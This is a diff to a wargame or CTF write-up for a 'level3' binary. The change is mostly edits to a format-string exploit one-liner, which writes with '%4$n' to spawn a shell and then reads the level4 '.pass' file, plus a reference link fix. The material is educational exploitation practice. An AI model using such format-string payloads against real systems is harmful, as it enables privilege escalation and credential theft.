@@ -171,7 +171,7 @@ Great! `0xbffff440` has now the value 0x40, and the terminal has been created
 We don't have the level4 rights with gdb. Lets try directly with the binary to access the shell:
 
 ```bash
-(echo `python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"'` ; cat) | ~/level3
+(python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"' ; cat) | ~/level3
 > Wait what?!
 
 $ id
@@ -189,7 +189,7 @@ $ cat /home/user/level4/.pass
 
 - [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
 
-- [gets vs fgets](https://iq.opengenus.org/gets-vs-fgets-in-c/#:~:text=depends%20on%20system-,gets()%20keeps%20reading%20input%20until%20newline%20character%20or%20end,of%20input%20characters%20is%20reached.)
+- [gets vs fgets](<https://iq.opengenus.org/gets-vs-fgets-in-c/#:~:text=depends%20on%20system-,gets()%20keeps%20reading%20input%20until%20newline%20character%20or%20end,of%20input%20characters%20is%20reached.>)
 
 - [Format string attack - Introduction](https://owasp.org/www-community/attacks/Format_string_attack)
 - [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)
